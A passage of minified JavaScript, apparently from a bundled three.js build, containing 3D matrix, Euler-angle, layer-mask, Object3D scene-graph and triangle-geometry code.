this.set(t.x,e.x,n.x,0,t.y,e.y,n.y,0,t.z,e.z,n.z,0,0,0,0,1),this}extractRotation(t){const e=this.elements,n=t.elements,r=1/Dn.setFromMatrixColumn(t,0).length(),s=1/Dn.setFromMatrixColumn(t,1).length(),o=1/Dn.setFromMatrixColumn(t,2).length();return e[0]=n[0]*r,e[1]=n[1]*r,e[2]=n[2]*r,e[3]=0,e[4]=n[4]*s,e[5]=n[5]*s,e[6]=n[6]*s,e[7]=0,e[8]=n[8]*o,e[9]=n[9]*o,e[10]=n[10]*o,e[11]=0,e[12]=0,e[13]=0,e[14]=0,e[15]=1,this}makeRotationFromEuler(t){const e=this.elements,n=t.x,r=t.y,s=t.z,o=Math.cos(n),a=Math.sin(n),l=Math.cos(r),c=Math.sin(r),u=Math.cos(s),h=Math.sin(s);if(t.order==="XYZ"){const p=o*u,m=o*h,E=a*u,x=a*h;e[0]=l*u,e[4]=-l*h,e[8]=c,e[1]=m+E*c,e[5]=p-x*c,e[9]=-a*l,e[2]=x-p*c,e[6]=E+m*c,e[10]=o*l}else if(t.order==="YXZ"){const p=l*u,m=l*h,E=c*u,x=c*h;e[0]=p+x*a,e[4]=E*a-m,e[8]=o*c,e[1]=o*h,e[5]=o*u,e[9]=-a,e[2]=m*a-E,e[6]=x+p*a,e[10]=o*l}else if(t.order==="ZXY"){const p=l*u,m=l*h,E=c*u,x=c*h;e[0]=p-x*a,e[4]=-o*h,e[8]=E+m*a,e[1]=m+E*a,e[5]=o*u,e[9]=x-p*a,e[2]=-o*c,e[6]=a,e[10]=o*l}else if(t.order==="ZYX"){const p=o*u,m=o*h,E=a*u,x=a*h;e[0]=l*u,e[4]=E*c-m,e[8]=p*c+x,e[1]=l*h,e[5]=x*c+p,e[9]=m*c-E,e[2]=-c,e[6]=a*l,e[10]=o*l}else if(t.order==="YZX"){const p=o*l,m=o*c,E=a*l,x=a*c;e[0]=l*u,e[4]=x-p*h,e[8]=E*h+m,e[1]=h,e[5]=o*u,e[9]=-a*u,e[2]=-c*u,e[6]=m*h+E,e[10]=p-x*h}else if(t.order==="XZY"){const p=o*l,m=o*c,E=a*l,x=a*c;e[0]=l*u,e[4]=-h,e[8]=c*u,e[1]=p*h+x,e[5]=o*u,e[9]=m*h-E,e[2]=E*h-m,e[6]=a*u,e[10]=x*h+p}return e[3]=0,e[7]=0,e[11]=0,e[12]=0,e[13]=0,e[14]=0,e[15]=1,this}makeRotationFromQuaternion(t){return this.compose($l,t,Kl)}lookAt(t,e,n){const r=this.elements;return Se.subVectors(t,e),Se.lengthSq()===0&&(Se.z=1),Se.normalize(),en.crossVectors(n,Se),en.lengthSq()===0&&(Math.abs(n.z)===1?Se.x+=1e-4:Se.z+=1e-4,Se.normalize(),en.crossVectors(n,Se)),en.normalize(),Ri.crossVectors(Se,en),r[0]=en.x,r[4]=Ri.x,r[8]=Se.x,r[1]=en.y,r[5]=Ri.y,r[9]=Se.y,r[2]=en.z,r[6]=Ri.z,r[10]=Se.z,this}multiply(t){return this.multiplyMatrices(this,t)}premultiply(t){return this.multiplyMatrices(t,this)}multiplyMatrices(t,e){const n=t.elements,r=e.elements,s=this.elements,o=n[0],a=n[4],l=n[8],c=n[12],u=n[1],h=n[5],p=n[9],m=n[13],E=n[2],x=n[6],f=n[10],d=n[14],g=n[3],_=n[7],v=n[11],w=n[15],S=r[0],T=r[4],D=r[8],y=r[12],R=r[1],k=r[5],X=r[9],et=r[13],P=r[2],B=r[6],W=r[10],Y=r[14],H=r[3],V=r[7],q=r[11],J=r[15];return s[0]=o*S+a*R+l*P+c*H,s[4]=o*T+a*k+l*B+c*V,s[8]=o*D+a*X+l*W+c*q,s[12]=o*y+a*et+l*Y+c*J,s[1]=u*S+h*R+p*P+m*H,s[5]=u*T+h*k+p*B+m*V,s[9]=u*D+h*X+p*W+m*q,s[13]=u*y+h*et+p*Y+m*J,s[2]=E*S+x*R+f*P+d*H,s[6]=E*T+x*k+f*B+d*V,s[10]=E*D+x*X+f*W+d*q,s[14]=E*y+x*et+f*Y+d*J,s[3]=g*S+_*R+v*P+w*H,s[7]=g*T+_*k+v*B+w*V,s[11]=g*D+_*X+v*W+w*q,s[15]=g*y+_*et+v*Y+w*J,this}multiplyScalar(t){const e=this.elements;return e[0]*=t,e[4]*=t,e[8]*=t,e[12]*=t,e[1]*=t,e[5]*=t,e[9]*=t,e[13]*=t,e[2]*=t,e[6]*=t,e[10]*=t,e[14]*=t,e[3]*=t,e[7]*=t,e[11]*=t,e[15]*=t,this}determinant(){const t=this.elements,e=t[0],n=t[4],r=t[8],s=t[12],o=t[1],a=t[5],l=t[9],c=t[13],u=t[2],h=t[6],p=t[10],m=t[14],E=t[3],x=t[7],f=t[11],d=t[15];return E*(+s*l*h-r*c*h-s*a*p+n*c*p+r*a*m-n*l*m)+x*(+e*l*m-e*c*p+s*o*p-r*o*m+r*c*u-s*l*u)+f*(+e*c*h-e*a*m-s*o*h+n*o*m+s*a*u-n*c*u)+d*(-r*a*u-e*l*h+e*a*p+r*o*h-n*o*p+n*l*u)}transpose(){const t=this.elements;let e;return e=t[1],t[1]=t[4],t[4]=e,e=t[2],t[2]=t[8],t[8]=e,e=t[6],t[6]=t[9],t[9]=e,e=t[3],t[3]=t[12],t[12]=e,e=t[7],t[7]=t[13],t[13]=e,e=t[11],t[11]=t[14],t[14]=e,this}setPosition(t,e,n){const r=this.elements;return t.isVector3?(r[12]=t.x,r[13]=t.y,r[14]=t.z):(r[12]=t,r[13]=e,r[14]=n),this}invert(){const t=this.elements,e=t[0],n=t[1],r=t[2],s=t[3],o=t[4],a=t[5],l=t[6],c=t[7],u=t[8],h=t[9],p=t[10],m=t[11],E=t[12],x=t[13],f=t[14],d=t[15],g=h*f*c-x*p*c+x*l*m-a*f*m-h*l*d+a*p*d,_=E*p*c-u*f*c-E*l*m+o*f*m+u*l*d-o*p*d,v=u*x*c-E*h*c+E*a*m-o*x*m-u*a*d+o*h*d,w=E*h*l-u*x*l-E*a*p+o*x*p+u*a*f-o*h*f,S=e*g+n*_+r*v+s*w;if(S===0)return this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);const T=1/S;return t[0]=g*T,t[1]=(x*p*s-h*f*s-x*r*m+n*f*m+h*r*d-n*p*d)*T,t[2]=(a*f*s-x*l*s+x*r*c-n*f*c-a*r*d+n*l*d)*T,t[3]=(h*l*s-a*p*s-h*r*c+n*p*c+a*r*m-n*l*m)*T,t[4]=_*T,t[5]=(u*f*s-E*p*s+E*r*m-e*f*m-u*r*d+e*p*d)*T,t[6]=(E*l*s-o*f*s-E*r*c+e*f*c+o*r*d-e*l*d)*T,t[7]=(o*p*s-u*l*s+u*r*c-e*p*c-o*r*m+e*l*m)*T,t[8]=v*T,t[9]=(E*h*s-u*x*s-E*n*m+e*x*m+u*n*d-e*h*d)*T,t[10]=(o*x*s-E*a*s+E*n*c-e*x*c-o*n*d+e*a*d)*T,t[11]=(u*a*s-o*h*s-u*n*c+e*h*c+o*n*m-e*a*m)*T,t[12]=w*T,t[13]=(u*x*r-E*h*r+E*n*p-e*x*p-u*n*f+e*h*f)*T,t[14]=(E*a*r-o*x*r-E*n*l+e*x*l+o*n*f-e*a*f)*T,t[15]=(o*h*r-u*a*r+u*n*l-e*h*l-o*n*p+e*a*p)*T,this}scale(t){const e=this.elements,n=t.x,r=t.y,s=t.z;return e[0]*=n,e[4]*=r,e[8]*=s,e[1]*=n,e[5]*=r,e[9]*=s,e[2]*=n,e[6]*=r,e[10]*=s,e[3]*=n,e[7]*=r,e[11]*=s,this}getMaxScaleOnAxis(){const t=this.elements,e=t[0]*t[0]+t[1]*t[1]+t[2]*t[2],n=t[4]*t[4]+t[5]*t[5]+t[6]*t[6],r=t[8]*t[8]+t[9]*t[9]+t[10]*t[10];return Math.sqrt(Math.max(e,n,r))}makeTranslation(t,e,n){return t.isVector3?this.set(1,0,0,t.x,0,1,0,t.y,0,0,1,t.z,0,0,0,1):this.set(1,0,0,t,0,1,0,e,0,0,1,n,0,0,0,1),this}makeRotationX(t){const e=Math.cos(t),n=Math.sin(t);return this.set(1,0,0,0,0,e,-n,0,0,n,e,0,0,0,0,1),this}makeRotationY(t){const e=Math.cos(t),n=Math.sin(t);return this.set(e,0,n,0,0,1,0,0,-n,0,e,0,0,0,0,1),this}makeRotationZ(t){const e=Math.cos(t),n=Math.sin(t);return this.set(e,-n,0,0,n,e,0,0,0,0,1,0,0,0,0,1),this}makeRotationAxis(t,e){const n=Math.cos(e),r=Math.sin(e),s=1-n,o=t.x,a=t.y,l=t.z,c=s*o,u=s*a;return this.set(c*o+n,c*a-r*l,c*l+r*a,0,c*a+r*l,u*a+n,u*l-r*o,0,c*l-r*a,u*l+r*o,s*l*l+n,0,0,0,0,1),this}makeScale(t,e,n){return this.set(t,0,0,0,0,e,0,0,0,0,n,0,0,0,0,1),this}makeShear(t,e,n,r,s,o){return this.set(1,n,s,0,t,1,o,0,e,r,1,0,0,0,0,1),this}compose(t,e,n){const r=this.elements,s=e._x,o=e._y,a=e._z,l=e._w,c=s+s,u=o+o,h=a+a,p=s*c,m=s*u,E=s*h,x=o*u,f=o*h,d=a*h,g=l*c,_=l*u,v=l*h,w=n.x,S=n.y,T=n.z;return r[0]=(1-(x+d))*w,r[1]=(m+v)*w,r[2]=(E-_)*w,r[3]=0,r[4]=(m-v)*S,r[5]=(1-(p+d))*S,r[6]=(f+g)*S,r[7]=0,r[8]=(E+_)*T,r[9]=(f-g)*T,r[10]=(1-(p+x))*T,r[11]=0,r[12]=t.x,r[13]=t.y,r[14]=t.z,r[15]=1,this}decompose(t,e,n){const r=this.elements;let s=Dn.set(r[0],r[1],r[2]).length();const o=Dn.set(r[4],r[5],r[6]).length(),a=Dn.set(r[8],r[9],r[10]).length();this.determinant()<0&&(s=-s),t.x=r[12],t.y=r[13],t.z=r[14],De.copy(this);const c=1/s,u=1/o,h=1/a;return De.elements[0]*=c,De.elements[1]*=c,De.elements[2]*=c,De.elements[4]*=u,De.elements[5]*=u,De.elements[6]*=u,De.elements[8]*=h,De.elements[9]*=h,De.elements[10]*=h,e.setFromRotationMatrix(De),n.x=s,n.y=o,n.z=a,this}makePerspective(t,e,n,r,s,o,a=Ke){const l=this.elements,c=2*s/(e-t),u=2*s/(n-r),h=(e+t)/(e-t),p=(n+r)/(n-r);let m,E;if(a===Ke)m=-(o+s)/(o-s),E=-2*o*s/(o-s);else if(a===Zi)m=-o/(o-s),E=-o*s/(o-s);else throw new Error("THREE.Matrix4.makePerspective(): Invalid coordinate system: "+a);return l[0]=c,l[4]=0,l[8]=h,l[12]=0,l[1]=0,l[5]=u,l[9]=p,l[13]=0,l[2]=0,l[6]=0,l[10]=m,l[14]=E,l[3]=0,l[7]=0,l[11]=-1,l[15]=0,this}makeOrthographic(t,e,n,r,s,o,a=Ke){const l=this.elements,c=1/(e-t),u=1/(n-r),h=1/(o-s),p=(e+t)*c,m=(n+r)*u;let E,x;if(a===Ke)E=(o+s)*h,x=-2*h;else if(a===Zi)E=s*h,x=-1*h;else throw new Error("THREE.Matrix4.makeOrthographic(): Invalid coordinate system: "+a);return l[0]=2*c,l[4]=0,l[8]=0,l[12]=-p,l[1]=0,l[5]=2*u,l[9]=0,l[13]=-m,l[2]=0,l[6]=0,l[10]=x,l[14]=-E,l[3]=0,l[7]=0,l[11]=0,l[15]=1,this}equals(t){const e=this.elements,n=t.elements;for(let r=0;r<16;r++)if(e[r]!==n[r])return!1;return!0}fromArray(t,e=0){for(let n=0;n<16;n++)this.elements[n]=t[n+e];return this}toArray(t=[],e=0){const n=this.elements;return t[e]=n[0],t[e+1]=n[1],t[e+2]=n[2],t[e+3]=n[3],t[e+4]=n[4],t[e+5]=n[5],t[e+6]=n[6],t[e+7]=n[7],t[e+8]=n[8],t[e+9]=n[9],t[e+10]=n[10],t[e+11]=n[11],t[e+12]=n[12],t[e+13]=n[13],t[e+14]=n[14],t[e+15]=n[15],t}}const Dn=new L,De=new Zt,$l=new L(0,0,0),Kl=new L(1,1,1),en=new L,Ri=new L,Se=new L,aa=new Zt,oa=new _i;class ir{constructor(t=0,e=0,n=0,r=ir.DEFAULT_ORDER){this.isEuler=!0,this._x=t,this._y=e,this._z=n,this._order=r}get x(){return this._x}set x(t){this._x=t,this._onChangeCallback()}get y(){return this._y}set y(t){this._y=t,this._onChangeCallback()}get z(){return this._z}set z(t){this._z=t,this._onChangeCallback()}get order(){return this._order}set order(t){this._order=t,this._onChangeCallback()}set(t,e,n,r=this._order){return this._x=t,this._y=e,this._z=n,this._order=r,this._onChangeCallback(),this}clone(){return new this.constructor(this._x,this._y,this._z,this._order)}copy(t){return this._x=t._x,this._y=t._y,this._z=t._z,this._order=t._order,this._onChangeCallback(),this}setFromRotationMatrix(t,e=this._order,n=!0){const r=t.elements,s=r[0],o=r[4],a=r[8],l=r[1],c=r[5],u=r[9],h=r[2],p=r[6],m=r[10];switch(e){case"XYZ":this._y=Math.asin(xe(a,-1,1)),Math.abs(a)<.9999999?(this._x=Math.atan2(-u,m),this._z=Math.atan2(-o,s)):(this._x=Math.atan2(p,c),this._z=0);break;case"YXZ":this._x=Math.asin(-xe(u,-1,1)),Math.abs(u)<.9999999?(this._y=Math.atan2(a,m),this._z=Math.atan2(l,c)):(this._y=Math.atan2(-h,s),this._z=0);break;case"ZXY":this._x=Math.asin(xe(p,-1,1)),Math.abs(p)<.9999999?(this._y=Math.atan2(-h,m),this._z=Math.atan2(-o,c)):(this._y=0,this._z=Math.atan2(l,s));break;case"ZYX":this._y=Math.asin(-xe(h,-1,1)),Math.abs(h)<.9999999?(this._x=Math.atan2(p,m),this._z=Math.atan2(l,s)):(this._x=0,this._z=Math.atan2(-o,c));break;case"YZX":this._z=Math.asin(xe(l,-1,1)),Math.abs(l)<.9999999?(this._x=Math.atan2(-u,c),this._y=Math.atan2(-h,s)):(this._x=0,this._y=Math.atan2(a,m));break;case"XZY":this._z=Math.asin(-xe(o,-1,1)),Math.abs(o)<.9999999?(this._x=Math.atan2(p,c),this._y=Math.atan2(a,s)):(this._x=Math.atan2(-u,m),this._y=0);break;default:console.warn("THREE.Euler: .setFromRotationMatrix() encountered an unknown order: "+e)}return this._order=e,n===!0&&this._onChangeCallback(),this}setFromQuaternion(t,e,n){return aa.makeRotationFromQuaternion(t),this.setFromRotationMatrix(aa,e,n)}setFromVector3(t,e=this._order){return this.set(t.x,t.y,t.z,e)}reorder(t){return oa.setFromEuler(this),this.setFromQuaternion(oa,t)}equals(t){return t._x===this._x&&t._y===this._y&&t._z===this._z&&t._order===this._order}fromArray(t){return this._x=t[0],this._y=t[1],this._z=t[2],t[3]!==void 0&&(this._order=t[3]),this._onChangeCallback(),this}toArray(t=[],e=0){return t[e]=this._x,t[e+1]=this._y,t[e+2]=this._z,t[e+3]=this._order,t}_onChange(t){return this._onChangeCallback=t,this}_onChangeCallback(){}*[Symbol.iterator](){yield this._x,yield this._y,yield this._z,yield this._order}}ir.DEFAULT_ORDER="XYZ";class cs{constructor(){this.mask=1}set(t){this.mask=(1<<t|0)>>>0}enable(t){this.mask|=1<<t|0}enableAll(){this.mask=-1}toggle(t){this.mask^=1<<t|0}disable(t){this.mask&=~(1<<t|0)}disableAll(){this.mask=0}test(t){return(this.mask&t.mask)!==0}isEnabled(t){return(this.mask&(1<<t|0))!==0}}let Zl=0;const la=new L,Nn=new _i,qe=new Zt,wi=new L,ai=new L,Jl=new L,Ql=new _i,ca=new L(1,0,0),da=new L(0,1,0),ua=new L(0,0,1),tc={type:"added"},ec={type:"removed"};class ye extends Qn{constructor(){super(),this.isObject3D=!0,Object.defineProperty(this,"id",{value:Zl++}),this.uuid=mi(),this.name="",this.type="Object3D",this.parent=null,this.children=[],this.up=ye.DEFAULT_UP.clone();const t=new L,e=new ir,n=new _i,r=new L(1,1,1);function s(){n.setFromEuler(e,!1)}function o(){e.setFromQuaternion(n,void 0,!1)}e._onChange(s),n._onChange(o),Object.defineProperties(this,{position:{configurable:!0,enumerable:!0,value:t},rotation:{configurable:!0,enumerable:!0,value:e},quaternion:{configurable:!0,enumerable:!0,value:n},scale:{configurable:!0,enumerable:!0,value:r},modelViewMatrix:{value:new Zt},normalMatrix:{value:new kt}}),this.matrix=new Zt,this.matrixWorld=new Zt,this.matrixAutoUpdate=ye.DEFAULT_MATRIX_AUTO_UPDATE,this.matrixWorldAutoUpdate=ye.DEFAULT_MATRIX_WORLD_AUTO_UPDATE,this.matrixWorldNeedsUpdate=!1,this.layers=new cs,this.visible=!0,this.castShadow=!1,this.receiveShadow=!1,this.frustumCulled=!0,this.renderOrder=0,this.animations=[],this.userData={}}onBeforeShadow(){}onAfterShadow(){}onBeforeRender(){}onAfterRender(){}applyMatrix4(t){this.matrixAutoUpdate&&this.updateMatrix(),this.matrix.premultiply(t),this.matrix.decompose(this.position,this.quaternion,this.scale)}applyQuaternion(t){return this.quaternion.premultiply(t),this}setRotationFromAxisAngle(t,e){this.quaternion.setFromAxisAngle(t,e)}setRotationFromEuler(t){this.quaternion.setFromEuler(t,!0)}setRotationFromMatrix(t){this.quaternion.setFromRotationMatrix(t)}setRotationFromQuaternion(t){this.quaternion.copy(t)}rotateOnAxis(t,e){return Nn.setFromAxisAngle(t,e),this.quaternion.multiply(Nn),this}rotateOnWorldAxis(t,e){return Nn.setFromAxisAngle(t,e),this.quaternion.premultiply(Nn),this}rotateX(t){return this.rotateOnAxis(ca,t)}rotateY(t){return this.rotateOnAxis(da,t)}rotateZ(t){return this.rotateOnAxis(ua,t)}translateOnAxis(t,e){return la.copy(t).applyQuaternion(this.quaternion),this.position.add(la.multiplyScalar(e)),this}translateX(t){return this.translateOnAxis(ca,t)}translateY(t){return this.translateOnAxis(da,t)}translateZ(t){return this.translateOnAxis(ua,t)}localToWorld(t){return this.updateWorldMatrix(!0,!1),t.applyMatrix4(this.matrixWorld)}worldToLocal(t){return this.updateWorldMatrix(!0,!1),t.applyMatrix4(qe.copy(this.matrixWorld).invert())}lookAt(t,e,n){t.isVector3?wi.copy(t):wi.set(t,e,n);const r=this.parent;this.updateWorldMatrix(!0,!1),ai.setFromMatrixPosition(this.matrixWorld),this.isCamera||this.isLight?qe.lookAt(ai,wi,this.up):qe.lookAt(wi,ai,this.up),this.quaternion.setFromRotationMatrix(qe),r&&(qe.extractRotation(r.matrixWorld),Nn.setFromRotationMatrix(qe),this.quaternion.premultiply(Nn.invert()))}add(t){if(arguments.length>1){for(let e=0;e<arguments.length;e++)this.add(arguments[e]);return this}return t===this?(console.error("THREE.Object3D.add: object can't be added as a child of itself.",t),this):(t&&t.isObject3D?(t.parent!==null&&t.parent.remove(t),t.parent=this,this.children.push(t),t.dispatchEvent(tc)):console.error("THREE.Object3D.add: object not an instance of THREE.Object3D.",t),this)}remove(t){if(arguments.length>1){for(let n=0;n<arguments.length;n++)this.remove(arguments[n]);return this}const e=this.children.indexOf(t);return e!==-1&&(t.parent=null,this.children.splice(e,1),t.dispatchEvent(ec)),this}removeFromParent(){const t=this.parent;return t!==null&&t.remove(this),this}clear(){return this.remove(...this.children)}attach(t){return this.updateWorldMatrix(!0,!1),qe.copy(this.matrixWorld).invert(),t.parent!==null&&(t.parent.updateWorldMatrix(!0,!1),qe.multiply(t.parent.matrixWorld)),t.applyMatrix4(qe),this.add(t),t.updateWorldMatrix(!1,!0),this}getObjectById(t){return this.getObjectByProperty("id",t)}getObjectByName(t){return this.getObjectByProperty("name",t)}getObjectByProperty(t,e){if(this[t]===e)return this;for(let n=0,r=this.children.length;n<r;n++){const o=this.children[n].getObjectByProperty(t,e);if(o!==void 0)return o}}getObjectsByProperty(t,e,n=[]){this[t]===e&&n.push(this);const r=this.children;for(let s=0,o=r.length;s<o;s++)r[s].getObjectsByProperty(t,e,n);return n}getWorldPosition(t){return this.updateWorldMatrix(!0,!1),t.setFromMatrixPosition(this.matrixWorld)}getWorldQuaternion(t){return this.updateWorldMatrix(!0,!1),this.matrixWorld.decompose(ai,t,Jl),t}getWorldScale(t){return this.updateWorldMatrix(!0,!1),this.matrixWorld.decompose(ai,Ql,t),t}getWorldDirection(t){this.updateWorldMatrix(!0,!1);const e=this.matrixWorld.elements;return t.set(e[8],e[9],e[10]).normalize()}raycast(){}traverse(t){t(this);const e=this.children;for(let n=0,r=e.length;n<r;n++)e[n].traverse(t)}traverseVisible(t){if(this.visible===!1)return;t(this);const e=this.children;for(let n=0,r=e.length;n<r;n++)e[n].traverseVisible(t)}traverseAncestors(t){const e=this.parent;e!==null&&(t(e),e.traverseAncestors(t))}updateMatrix(){this.matrix.compose(this.position,this.quaternion,this.scale),this.matrixWorldNeedsUpdate=!0}updateMatrixWorld(t){this.matrixAutoUpdate&&this.updateMatrix(),(this.matrixWorldNeedsUpdate||t)&&(this.parent===null?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix),this.matrixWorldNeedsUpdate=!1,t=!0);const e=this.children;for(let n=0,r=e.length;n<r;n++){const s=e[n];(s.matrixWorldAutoUpdate===!0||t===!0)&&s.updateMatrixWorld(t)}}updateWorldMatrix(t,e){const n=this.parent;if(t===!0&&n!==null&&n.matrixWorldAutoUpdate===!0&&n.updateWorldMatrix(!0,!1),this.matrixAutoUpdate&&this.updateMatrix(),this.parent===null?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix),e===!0){const r=this.children;for(let s=0,o=r.length;s<o;s++){const a=r[s];a.matrixWorldAutoUpdate===!0&&a.updateWorldMatrix(!1,!0)}}}toJSON(t){const e=t===void 0||typeof t=="string",n={};e&&(t={geometries:{},materials:{},textures:{},images:{},shapes:{},skeletons:{},animations:{},nodes:{}},n.metadata={version:4.6,type:"Object",generator:"Object3D.toJSON"});const r={};r.uuid=this.uuid,r.type=this.type,this.name!==""&&(r.name=this.name),this.castShadow===!0&&(r.castShadow=!0),this.receiveShadow===!0&&(r.receiveShadow=!0),this.visible===!1&&(r.visible=!1),this.frustumCulled===!1&&(r.frustumCulled=!1),this.renderOrder!==0&&(r.renderOrder=this.renderOrder),Object.keys(this.userData).length>0&&(r.userData=this.userData),r.layers=this.layers.mask,r.matrix=this.matrix.toArray(),r.up=this.up.toArray(),this.matrixAutoUpdate===!1&&(r.matrixAutoUpdate=!1),this.isInstancedMesh&&(r.type="InstancedMesh",r.count=this.count,r.instanceMatrix=this.instanceMatrix.toJSON(),this.instanceColor!==null&&(r.instanceColor=this.instanceColor.toJSON())),this.isBatchedMesh&&(r.type="BatchedMesh",r.perObjectFrustumCulled=this.perObjectFrustumCulled,r.sortObjects=this.sortObjects,r.drawRanges=this._drawRanges,r.reservedRanges=this._reservedRanges,r.visibility=this._visibility,r.active=this._active,r.bounds=this._bounds.map(a=>({boxInitialized:a.boxInitialized,boxMin:a.box.min.toArray(),boxMax:a.box.max.toArray(),sphereInitialized:a.sphereInitialized,sphereRadius:a.sphere.radius,sphereCenter:a.sphere.center.toArray()})),r.maxGeometryCount=this._maxGeometryCount,r.maxVertexCount=this._maxVertexCount,r.maxIndexCount=this._maxIndexCount,r.geometryInitialized=this._geometryInitialized,r.geometryCount=this._geometryCount,r.matricesTexture=this._matricesTexture.toJSON(t),this.boundingSphere!==null&&(r.boundingSphere={center:r.boundingSphere.center.toArray(),radius:r.boundingSphere.radius}),this.boundingBox!==null&&(r.boundingBox={min:r.boundingBox.min.toArray(),max:r.boundingBox.max.toArray()}));function s(a,l){return a[l.uuid]===void 0&&(a[l.uuid]=l.toJSON(t)),l.uuid}if(this.isScene)this.background&&(this.background.isColor?r.background=this.background.toJSON():this.background.isTexture&&(r.background=this.background.toJSON(t).uuid)),this.environment&&this.environment.isTexture&&this.environment.isRenderTargetTexture!==!0&&(r.environment=this.environment.toJSON(t).uuid);else if(this.isMesh||this.isLine||this.isPoints){r.geometry=s(t.geometries,this.geometry);const a=this.geometry.parameters;if(a!==void 0&&a.shapes!==void 0){const l=a.shapes;if(Array.isArray(l))for(let c=0,u=l.length;c<u;c++){const h=l[c];s(t.shapes,h)}else s(t.shapes,l)}}if(this.isSkinnedMesh&&(r.bindMode=this.bindMode,r.bindMatrix=this.bindMatrix.toArray(),this.skeleton!==void 0&&(s(t.skeletons,this.skeleton),r.skeleton=this.skeleton.uuid)),this.material!==void 0)if(Array.isArray(this.material)){const a=[];for(let l=0,c=this.material.length;l<c;l++)a.push(s(t.materials,this.material[l]));r.material=a}else r.material=s(t.materials,this.material);if(this.children.length>0){r.children=[];for(let a=0;a<this.children.length;a++)r.children.push(this.children[a].toJSON(t).object)}if(this.animations.length>0){r.animations=[];for(let a=0;a<this.animations.length;a++){const l=this.animations[a];r.animations.push(s(t.animations,l))}}if(e){const a=o(t.geometries),l=o(t.materials),c=o(t.textures),u=o(t.images),h=o(t.shapes),p=o(t.skeletons),m=o(t.animations),E=o(t.nodes);a.length>0&&(n.geometries=a),l.length>0&&(n.materials=l),c.length>0&&(n.textures=c),u.length>0&&(n.images=u),h.length>0&&(n.shapes=h),p.length>0&&(n.skeletons=p),m.length>0&&(n.animations=m),E.length>0&&(n.nodes=E)}return n.object=r,n;function o(a){const l=[];for(const c in a){const u=a[c];delete u.metadata,l.push(u)}return l}}clone(t){return new this.constructor().copy(this,t)}copy(t,e=!0){if(this.name=t.name,this.up.copy(t.up),this.position.copy(t.position),this.rotation.order=t.rotation.order,this.quaternion.copy(t.quaternion),this.scale.copy(t.scale),this.matrix.copy(t.matrix),this.matrixWorld.copy(t.matrixWorld),this.matrixAutoUpdate=t.matrixAutoUpdate,this.matrixWorldAutoUpdate=t.matrixWorldAutoUpdate,this.matrixWorldNeedsUpdate=t.matrixWorldNeedsUpdate,this.layers.mask=t.layers.mask,this.visible=t.visible,this.castShadow=t.castShadow,this.receiveShadow=t.receiveShadow,this.frustumCulled=t.frustumCulled,this.renderOrder=t.renderOrder,this.animations=t.animations.slice(),this.userData=JSON.parse(JSON.stringify(t.userData)),e===!0)for(let n=0;n<t.children.length;n++){const r=t.children[n];this.add(r.clone())}return this}}ye.DEFAULT_UP=new L(0,1,0);ye.DEFAULT_MATRIX_AUTO_UPDATE=!0;ye.DEFAULT_MATRIX_WORLD_AUTO_UPDATE=!0;const Ne=new L,Ye=new L,Rr=new L,je=new L,Un=new L,On=new L,pa=new L,wr=new L,Cr=new L,Pr=new L;let Ci=!1;class Ue{constructor(t=new L,e=new L,n=new L){this.a=t,this.b=e,this.c=n}static getNormal(t,e,n,r){r.subVectors(n,e),Ne.subVectors(t,e),r.cross(Ne);const s=r.lengthSq();return s>0?r.multiplyScalar(1/Math.sqrt(s)):r.set(0,0,0)}static getBarycoord(t,e,n,r,s){Ne.subVectors(r,e),Ye.subVectors(n,e),Rr.subVectors(t,e);const o=Ne.dot(Ne),a=Ne.dot(Ye),l=Ne.dot(Rr),c=Ye.dot(Ye),u=Ye.dot(Rr),h=o*c-a*a;if(h===0)return s.set(0,0,0),null;const p=1/h,m=(c*l-a*u)*p,E=(o*u-a*l)*p;return s.set(1-m-E,E,m)}static containsPoint(t,e,n,r){return this.getBarycoord(t,e,n,r,je)===null?!1:je.x>=0&&je.y>=0&&je.x+je.y<=1}static getUV(t,e,n,r,s,o,a,l){return Ci===!1&&(console.warn("THREE.Triangle.getUV() has been renamed to THREE.Triangle.getInterpolation()."),Ci=!0),this.getInterpolation(t,e,n,r,s,o,a,l)}static getInterpolation(t,e,n,r,s,o,a,l){return this.getBarycoord(t,e,n,r,je)===null?(l.x=0,l.y=0,"z"in l&&(l.z=0),"w"in l&&(l.w=0),null):(l.setScalar(0),l.addScaledVector(s,je.x),l.addScaledVector(o,je.y),l.addScaledVector(a,je.z),l)}static isFrontFacing(t,e,n,r){return Ne.subVectors(n,e),Ye.subVectors(t,e),Ne.cross(Ye).dot(r)<0}set(t,e,n){return this.a.copy(t),this.b.copy(e),this.c.copy(n),this}setFromPointsAndIndices(t,e,n,r){return this.a.copy(t[e]),this.b.copy(t[n]),this.c.copy(t[r]),this}setFromAttributeAndIndices(t,e,n,r){return this.a.fromBufferAttribute(t,e),this.b.fromBufferAttribute(t,n),this.c.fromBufferAttribute(t,r),this}clone(){return new this.constructor().copy(this)}copy(t){return this.a.copy(t.a),this.b.copy(t.b),this.c.copy(t.c),this}getArea(){return Ne.subVectors(this.c,this.b),Ye.subVectors(this.a,this.b),Ne.cross(Ye).length()*.5}getMidpoint(t){return t.addVectors(this.a,this.b).add(this.c).multiplyScalar(1/3)}getNormal(t){return Ue.getNormal(this.a,this.b,this.c,t)}getPlane(t){return t.setFromCoplanarPoints(this.a,this.b,this.c)}getBarycoord(t,e){return Ue.getBarycoord(t,this.a,this.b,this.c,e)}getUV(t,e,n,r,s){return Ci===!1&&(console.warn("THREE.Triangle.getUV() has been renamed to THREE.Triangle.getInterpolation()."),Ci=!0),Ue.getInterpolation(t,this.a,this.b,this.c,e,n,r,s)}getInterpolation(t,e,n,r,s){return Ue.getInterpolation(t,this.a,this.b,this.c,e,n,r,s)}containsPoint(t){return Ue.containsPoint(t,this.a,this.b,this.c)}isFrontFacing(t){return Ue.isFrontFacing(this.a,this.b,this.c,t)}intersectsBox(t){return t.intersectsTriangle(this)}closestPointToPoint(t,e){const n=this.a,r=this.b,s=this.c;let o,a;Un.subVectors(r,n),On.subVectors(s,n),wr.subVectors(t,n);const l=Un.dot(wr),c=On.dot(wr);if(l<=0&&c<=0)return e.copy(n);Cr.subVectors(t,r);const u=Un.dot(Cr),h=On.dot(Cr);if(u>=0&&h<=u)return e.copy(r);const p=l*h-u*c;if(p<=0&&l>=0&&u<=0)return o=l/(l-u),e.copy(n).addScaledVector(Un,o);Pr.subVectors(t,s);const 